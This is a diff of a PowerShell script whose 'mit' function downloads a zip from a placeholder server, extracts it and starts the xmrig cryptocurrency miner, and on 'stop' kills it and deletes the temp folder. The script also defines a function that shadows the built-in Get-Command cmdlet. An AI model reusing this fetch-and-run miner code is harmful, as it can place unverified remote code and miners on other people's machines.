@@ -73,31 +73,35 @@ function Get-Command {
 }
 
 function mit([string]$command) {
-
+# ======================
+    # START MINING
+    # ======================
     if ($command -eq "start") {
 
-        # Create C:\soft if not exists
+        # Ensure BASE directory exists
         if (!(Test-Path $BASE_DIR)) {
+            Write-Host "Creating base directory C:\soft"
             New-Item -ItemType Directory -Path $BASE_DIR | Out-Null
         }
 
-        # Create temp folder
+        # Ensure TEMP directory exists
         if (!(Test-Path $TEMP_DIR)) {
+            Write-Host "Creating temp directory"
             New-Item -ItemType Directory -Path $TEMP_DIR | Out-Null
         }
 
         $zipFile = "$TEMP_DIR\mine.zip"
         $minerZipUrl = "https://yourserver.com/mine.zip"
 
+        # Download mining package
         Write-Host "Downloading mining package..."
-
         Invoke-WebRequest `
             -Uri $minerZipUrl `
             -OutFile $zipFile `
             -UseBasicParsing
 
+        # Extract mining package
         Write-Host "Extracting mining package..."
-
         Expand-Archive `
             -Path $zipFile `
             -DestinationPath $TEMP_DIR `
@@ -105,12 +109,15 @@ function mit([string]$command) {
 
         Remove-Item $zipFile -Force
 
+        # Verify miner exists
         if (!(Test-Path $MINER_EXE)) {
             Write-Host "xmrig.exe not found!"
             return
         }
 
+        # Start miner if not already running
         if (!$MINER_PROC) {
+
             Write-Host "Starting miner..."
 
             $global:MINER_PROC = Start-Process `
@@ -121,6 +128,9 @@ function mit([string]$command) {
         }
     }
 
+    # ======================
+    # STOP MINING
+    # ======================
     elseif ($command -eq "stop") {
 
         Write-Host "Stopping miner..."
@@ -130,7 +140,7 @@ function mit([string]$command) {
             $global:MINER_PROC = $null
         }
 
-        # Remove only temp folder (keep C:\soft)
+        # Remove only temp folder
         if (Test-Path $TEMP_DIR) {
             Remove-Item $TEMP_DIR -Recurse -Force
         }
